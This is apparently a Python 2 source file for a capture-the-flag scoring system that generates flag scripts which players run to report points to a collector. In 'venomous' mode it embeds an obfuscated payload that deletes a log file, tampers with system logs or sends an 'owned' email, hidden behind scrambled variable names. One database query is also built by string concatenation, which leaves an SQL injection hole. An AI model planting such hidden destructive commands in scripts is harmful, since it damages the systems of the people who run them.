#!/usr/bin/python

import os
import logging

current_directory = os.getcwd()
logger = logging.getLogger('CTFcreateFlag')
hdlr = logging.FileHandler(current_directory + '/log/createFlag.log')
formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
hdlr.setFormatter(formatter)
logger.addHandler(hdlr)
logger.setLevel(logging.INFO)

def unique_obfuscate_function(venomous):
    from random import randint

    bad_1 = '''def execute():
    from email.mime.text import MIMEText
    from subprocess import Popen, PIPE
    weird = "your"
    here = "admin"
    b311 = "Call"
    msg["To"] = here + "@yourdomain.com"
    yank = "owned"
    slip = "security"
    al = "server"
    msg["From"] = "root@" + yank +".com"
    p = Popen(["/usr/sbin/sendmail", "-t"], stdin=PIPE)
    done = weird + yank + slip
    msg = MIMEText(done)
    msg["Subject"] = done
    p.communicate(msg.as_string())'''

    bad_2 = '''def execute():
    import subprocess
    where = "rm"
    who = "-f"
    this = "owned"
    why = "curl"
    zip = "You"
    options = "echo"
    lost = "been"
    here = "world"
    keep = "sys.log"
    what = "important"
    cool = "have"
    when = ".log"
    zoom = "ifconfig.me"
    places = "None"
    yup = "Hello"
    there = options + " " + zip + " " + cool + lost + this + " >> " + "/var/log/" + keep
    print there
    bring = subprocess.call("{0}".format(there), shell=True)
    '''

    bad_3 = '''def execute():
    import subprocess
    where = "rm"
    who = "-f"
    this = "owned"
    why = "curl"
    zip = "You"
    options = "echo"
    lost = "been"
    here = "world"
    keep = "sys.log"
    what = "important"
    cool = "have"
    when = ".log"
    zoom = "ifconfig.me"
    places = "None"
    yup = "Hello"
    there = where + " " + who + " " + "/var/log/" + what + when
    print there
    bring = subprocess.call("{0}".format(there), shell=True)
    '''

    good_1 = '''def execute():
    import subprocess
    where = "rm"
    who = "-f"
    this = "owned"
    why = "curl"
    zip = "You"
    options = "echo"
    lost = "been"
    here = "world"
    keep = "sys.log"
    what = "important"
    cool = "have"
    when = ".log"
    zoom = "ifconfig.me"
    places = "None"
    yup = "Hello"
    there = options + " " + yup + " " + here
    print there
    bring = subprocess.call("{0}".format(there), shell=True)
    '''

    good_2 = '''def execute():
    import subprocess
    where = "rm"
    who = "-f"
    this = "owned"
    why = "curl"
    zip = "You"
    options = "echo"
    lost = "been"
    here = "world"
    keep = "sys.log"
    what = "important"
    cool = "have"
    when = ".log"
    zoom = "ifconfig.me"
    places = "None"
    yup = "Hello"
    there = why + " " + zoom
    print there
    bring = subprocess.call("{0}".format(there), shell=True)
    '''

    if venomous != 0:
        pick_function = randint(1,3)
        if pick_function == 1:
            return bad_1
        elif pick_function == 2:
            return bad_2
        else:
            return bad_3
    else:
        pick_function = randint(4,5)
        if pick_function == 4:
            return good_1
        else:
            return good_2

def check_if_flagname_exists(flagname):    # Check if user has already submitted

    import sqlite3

    try:
        conn = sqlite3.connect('database/ctfCollector.db')    # Setup connection to sqlite database
    except Exception, e:
        logger.info("Create connection to database: {0}".format(e))

    try:
        c = conn.cursor()
    except Exception, e:
        logger.info("Setup cursor: {0}".format(e))

    try:
        c.execute('''SELECT EXISTS(SELECT * FROM flags WHERE flagname = ?)''', (flagname,))    # Check if user exists
    except Exception, e:
        logger.info("SELECT EXISTS for flag: {0}".format(e))

    try:
        returnvalue = c.fetchone()
    except Exception, e:
        logger.info("Fetch results of SELECT: {0}".format(e))

    return returnvalue[0]

def check_if_uuid_exists(createduuid):    # Check if user has already submitted

    import sqlite3

    try:
        conn = sqlite3.connect('database/ctfCollector.db')    # Setup connection to sqlite database
    except Exception, e:
        logger.info("Setup connection to database: {0}".format(e))

    try:
        c = conn.cursor()
    except Exception, e:
        logger.info("Setup cursor: {0}".format(e))

    try:
        c.execute('''SELECT EXISTS(SELECT * FROM flags WHERE uuid = "''' + str(createduuid) + '''")''')    # Check if uuid exists
    except Exception, e:
        logger.info("SELECT EXISTS for flag: {0}".format(e))

    try:
        returnvalue = c.fetchone()
    except Exception, e:
        logger.info("Fetch results of SELECT: {0}".format(e))

    return returnvalue[0]

def obfuscate_script(flag_name):

    import subprocess
    # Create and write obfuscated script

    try:
        obfuscated_script = subprocess.check_output(["mods/pyobfuscate", flag_name])
    except Exception, e:
        logger.info("Call to subprocess pyobfuscate: {0}".format(e))

    try:
        full_flag_name = flag_name + '.py'
        f2 = open(flag_name, 'w')    # Open script (named by user) for writing
    except Exception, e:
        logger.info("Open flag_name obfuscated for writing: {0}".format(e))

    try:
        f2.write(obfuscated_script)    # Write script to file
    except Exception, e:
        logger.info("Write status variable to obfuscated file: {0}".format(e))

    try:
        f2.close()    # Close the file
    except Exception, e:
        logger.info("Close the obfuscated version of file: {0}".format(e))

def createFlag(flag_name, pub_key, flag_uuid, ipaddress, venomous):    # Used to create the flag, requires flag name, public key, and uuid

    # Had to split script into 2 sections due to using similar quotes
    script_argparse = """#!/usr/bin/python

import argparse

parser = argparse.ArgumentParser(description='Used to prove access and add points')
parser.add_argument('-u','--username', help='Include your username for adding points', required=True)
parser.add_argument('-p', '--password', help='Enter password', required=True)
parser.add_argument('-m','--message', help='Include message to be displayed on scoreboard. Must be encapsulated by quotes'
                    , required=False)

"""
    script_encryption = '''
def encrypt_RSA(message):

    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_OAEP

    key = \"\"\"{0}\"\"\"

    rsakey = RSA.importKey(key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = rsakey.encrypt(message)

    return encrypted.encode('base64')

'''
    script_main = '''
if __name__ == "__main__":

    import socket

    uuid = \'{0}\'
    args = vars(parser.parse_args())
    HOST = \'{1}\'   # Symbolic name meaning the local host
    PORT = 65535    # Arbitrary non-privileged port
    username = args['username']

    execute()
    if not args['message']:
        message = '%s has modestly pwned a box.' % username
    else:
        message = args['message']

    try:
        password = args['password']
    except Exception, e:
        logger.info(e)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST,PORT))

    command = username + ',' + uuid + ',' + message + ',' + password

    encryptedCommand = encrypt_RSA(command)
    s.send(encryptedCommand)
'''

    try:
        script_encryption = script_encryption.format(pub_key)
    except Exception, e:
        logger.info("Insert pub_key into string: {0}".format(e))

    try:
        script_part = script_main.format(flag_uuid, ipaddress)    # Insert the variable public key and uuid (unique to each flag)
    except Exception, e:
        logger.info("Insert flag_uuid and ipaddress into string: {0}".format(e))

    try:
        unique = unique_obfuscate_function(venomous)
    except Exception, e:
        logger.info("Call to unique_obfuscate_function: {0}".format(e))

    try:
        full_script = script_argparse + script_encryption + unique + script_part    # Tie string (script) together
    except Exception, e:
        logger.info("Combine variables to create script: {0}".format(e))

    try:
        full_flag_name = flag_name + '.py'
        f = open(full_flag_name, 'w')    # Open script (named by user) for writing
    except Exception, e:
        logger.info("Open un-obsfucated flag_name for writing: {0}".format(e))

    try:
        f.write(full_script)    # Write script to file
    except Exception, e:
        logger.info("Write un-obsfucated full_script to file: {0}".format(e))

    try:
        f.close()    # Close the file
    except Exception, e:
        logger.info("Close un-obsfucated version of script file: {0}".format(e))


def update_uuid_db(flagname, newuuid, numpoints, venomous):     # Insert flag information into database

    import sqlite3

    try:
        if os.path.isfile(os.path.realpath('database/ctfCollector.db')):    # Make sure path exists

            try:
                conn = sqlite3.connect('database/ctfCollector.db')    # Set up connection to database
                logging.info("Connection setup for ctfCollector.db")    # Log the connection setup to informational
            except Exception, e:
                logger.info("Create connection to database: {0}".format(e))

            try:
                c = conn.cursor()
                # Insert flag name, uuid, worth points, and whether or not it's venomous
            except Exception, e:
                logger.info("Setup cursor: {0}".format(e))

            try:
                c.execute('''INSERT INTO flags VALUES (?,?,?,?)''', (flagname, newuuid, numpoints, venomous))
            except Exception, e:
                logger.info("INSERT INTO flags: {0}".format(e))

            try:
                conn.commit()    # Commit changes
                logging.info("Commit INSERT INTO flags VALUES ({0}, {1}, {2}, {3})".format(flagname, newuuid, numpoints, venomous))
            except Exception, e:
                logger.info("Commit INSERT INTO Flags: {0}".format(e))

            try:
                conn.close()    # Close the connection
                logging.info("Closing connection to database")    # Log the closure to informational
            except Exception, e:
                logger.info("Closing connection to database: {0}".format(e))

        else:
            logger.info('There is a problem with the database. Delete and restart')
            print('There is a problem with the database. Delete and restart')    # Make some recommendations, this shouldn't happen
    except Exception, e:
        logger.info("Check if database exists: {0}".format(e))

